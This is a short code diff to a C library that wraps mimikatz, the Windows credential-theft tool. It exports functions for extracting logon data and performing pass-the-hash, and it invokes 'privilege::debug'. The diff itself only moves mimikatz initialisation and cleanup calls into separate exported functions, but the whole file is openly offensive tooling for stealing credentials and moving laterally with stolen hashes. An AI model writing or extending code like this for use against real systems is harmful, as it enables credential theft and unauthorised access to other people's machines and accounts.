@@ -31,7 +31,6 @@ BOOL AiGetLogonData(AI_LOGON_DATA_TYPE *logonData, DWORD inputEntryCount, DWORD 
 
   gLogonDataContainer = &logonDataContainer;
 
-  mimikatz_initOrClean(TRUE);
   status = mimikatz_dispatchCommand(L"privilege::debug");
   if (status != 0) {
     DebugPrint("Error: privilege::debug failed with status %x\n", status);
@@ -47,7 +46,6 @@ BOOL AiGetLogonData(AI_LOGON_DATA_TYPE *logonData, DWORD inputEntryCount, DWORD 
   *outputEntryCount = gLogonDataContainer->OutputEntryCount;
 
 EXIT_OUT:
-  mimikatz_initOrClean(FALSE);
 
   gLogonDataContainer = 0;
   return status == 0;
@@ -57,7 +55,6 @@ EXIT_OUT:
 MIMIKATZ_API BOOL AiPassTheHash(const wchar_t *pthCommadLine) {
   NTSTATUS status = 0;
 
-  mimikatz_initOrClean(TRUE);
   status = mimikatz_dispatchCommand(L"privilege::debug");
   if (status != 0) {
     DebugPrint("Error: privilege::debug failed with status %x\n", status);
@@ -71,7 +68,6 @@ MIMIKATZ_API BOOL AiPassTheHash(const wchar_t *pthCommadLine) {
   }
 
 EXIT_OUT:
-  mimikatz_initOrClean(FALSE);
 
   gLogonDataContainer = 0;
   return status == 0;
@@ -84,3 +80,10 @@ MIMIKATZ_API VOID AiEnableLogging(BOOL enable) {
   gEnableLogging = enable;
 }
 
+MIMIKATZ_API VOID AiMimikatzInit() {
+	mimikatz_initOrClean(TRUE);
+}
+
+MIMIKATZ_API VOID AiMimikatzCleanup() {
+	mimikatz_initOrClean(FALSE);
+}
